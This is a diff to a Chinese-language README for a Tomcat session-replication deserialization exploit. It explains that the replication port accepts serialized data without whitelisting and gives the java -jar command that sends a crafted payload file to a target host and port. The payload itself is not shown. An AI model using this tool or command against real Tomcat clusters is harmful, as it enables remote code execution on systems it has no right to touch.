@@ -1,7 +1,7 @@
 ### tomcat session 同步exp
 
 1. tomcat session 同步的时候会使用反序列化，这里tomcat没有做白名单处理，存在任意反序列化的问题
-2. tomcat session 同步会开启一个端口接受反序列化数据，例如下文tomcat-session同步配置的<Receiver>节点的恩日哦给你
+2. tomcat session 同步会开启一个端口接受反序列化数据，例如下文tomcat-session同步配置的<Receiver>节点的port就是开启的端口
 
 
 
@@ -17,7 +17,7 @@ mvn package
 ```
 3、复制test.ser到本工程的目录下
 ```
-java -jar tomcat-sesesion-syn-deserialization-1.0-SNAPSHOT-jar-with-dependencies.jar  -h ${your ip} -p ${your port} -f ${youre serialization file}
+java -jar tomcat-sesesion-syn-deserialization-1.0-SNAPSHOT-jar-with-dependencies.jar  -h ${同步session的ip} -p ${同步session的port} -f ${youre serialization file}
 ```
 
 ### 条件
